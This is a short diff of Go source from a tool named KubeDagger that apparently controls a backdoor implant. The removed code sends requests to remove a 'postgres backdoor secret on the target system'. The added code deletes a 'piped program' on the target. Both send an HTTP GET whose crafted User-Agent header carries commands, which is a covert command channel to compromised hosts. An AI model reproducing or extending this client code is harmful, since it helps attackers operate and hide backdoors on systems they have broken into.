@@ -14,7 +14,7 @@ See the License for the specific language governing permissions and
 limitations under the License.
 */
 
-package postgres
+package pipe_prog
 
 import (
 	"io/ioutil"
@@ -23,19 +23,19 @@ import (
 
 	"github.com/sirupsen/logrus"
 
-	"github.com/yasindce1998/KubeDagger/cmd/KubeDagger-client/run/utils"
+	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/utils"
 )
 
-// SendDelPostgresRoleRequest sends a request to remove a postgres backdoor secret on the target system
-func SendDelPostgresRoleRequest(target string, secret string) error {
+// SendDelPipeProgRequest sends a request to delete a piped program on the target system
+func SendDelPipeProgRequest(target string, from string, to string) error {
 	client := &http.Client{}
 
-	req, err := http.NewRequest("GET", target+"/del_pg_role", nil)
+	req, err := http.NewRequest("GET", target+"/del_pipe_pg", nil)
 	if err != nil {
 		logrus.Fatalln(err)
 	}
 
-	req.Header.Set("User-Agent", buildDelUserAgent(secret))
+	req.Header.Set("User-Agent", buildUserAgent(from, to, ""))
 
 	b, err := httputil.DumpRequest(req, true)
 	logrus.Debugf("\n%s", utils.CleanupHost(string(b)))
